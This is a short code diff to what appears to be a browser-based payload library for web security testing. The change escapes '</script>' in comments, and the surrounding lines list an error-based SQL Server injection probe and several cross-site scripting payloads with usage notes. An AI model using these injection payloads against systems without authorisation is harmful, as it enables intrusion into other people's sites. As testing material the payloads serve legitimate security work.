@@ -261,7 +261,7 @@
         const { useState } = React;
         const e = React.createElement;
         
-        // Payload library is stored as JSON (not inline JS) to prevent </script> parsing breaks.
+        // Payload library is stored as JSON (not inline JS) to prevent <\/script> parsing breaks.
         // This makes the payload system future-proof even with large libraries.
         function loadPayloadLibrary() {
             try {
@@ -578,7 +578,7 @@ e(/"/g, '&quot;').replace(/'/g, '&#39;');
             { name: "Error-based probe", payload: "' AND 1=CONVERT(int,(SELECT @@version)) --", tags: "error", notes: "May trigger visible errors (SQL Server)." }
         ],
         xss: [
-            { name: "Simple script tag", payload: "<script>alert(1)<\/script>", tags: "reflected", notes: "Works on permissive contexts. Escaped </script> is required inside script blocks." },
+            { name: "Simple script tag", payload: "<script>alert(1)<\/script>", tags: "reflected", notes: "Works on permissive contexts. Escaped <\/script> is required inside script blocks." },
             { name: "IMG onerror", payload: "<img src=x onerror=alert(1)>", tags: "reflected", notes: "Often works when <script> is filtered but attributes pass." },
             { name: "SVG onload", payload: "<svg onload=alert(1)></svg>", tags: "reflected", notes: "Common alternative vector." },
             { name: "Attribute break-out (double quote)", payload: "\"><img src=x onerror=alert(1)>", tags: "attr", notes: "Use when injection occurs inside an HTML attribute quoted with \". " },
